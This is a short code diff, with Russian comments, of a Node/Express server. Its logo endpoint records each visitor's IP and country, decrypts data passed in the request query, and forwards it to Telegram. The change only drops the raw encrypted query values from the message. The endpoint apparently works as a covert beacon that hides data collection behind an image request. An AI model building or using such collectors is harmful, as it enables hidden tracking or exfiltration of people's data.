@@ -53,7 +53,7 @@ app.get('/', async (req, res) => {
     console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);
 
     // Отправляем данные в Telegram (асинхронно, не ждем завершения)
-    sendToTelegram(userIp, country, req.query, decryptedData);
+    sendToTelegram(userIp, country, decryptedData);
 
     // Отправляем изображение
     const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
@@ -119,17 +119,12 @@ async function getCountryByIp(ip: any) {
 }
 
 // Функция отправки в Telegram
-async function sendToTelegram(ip: any, country: any, queryData: any, decryptedData:any) {
+async function sendToTelegram(ip: any, country: any, decryptedData:any) {
   try {
     // Форматируем сообщение
     let message = `🌐 *Новый запрос логотипа*\n\n`;
     message += `🖥️ *IP*: ${ip}\n`;
     message += `📍 *Страна*: ${country}\n\n`;
-    
-    message += `🔐 *Зашифрованные данные (query)*:\n`;
-    for (const [key, value] of Object.entries(queryData)) {
-      message += `▫️ ${key}: \`${value}\`\n`;
-    }
     
     if (decryptedData) {
       message += `\n🔓 *Расшифрованные данные*:\n`;
